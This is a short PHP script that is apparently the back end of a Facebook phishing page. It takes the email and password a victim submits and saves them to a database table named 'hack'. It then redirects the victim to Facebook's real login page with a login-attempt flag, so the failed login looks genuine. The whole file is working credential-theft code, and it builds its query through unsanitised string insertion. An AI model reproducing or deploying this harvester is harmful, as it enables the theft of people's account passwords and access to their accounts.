<?php
	
	require_once('connect.php');
	$email=$_REQUEST['email'];
	$pass=$_REQUEST['pass'];
	$query="INSERT INTO `hack` VALUES ('$email','$pass')";
	$result=$mysqli->query($query);
	header('Location:https://www.facebook.com/login.php?login_attempt=1');
?>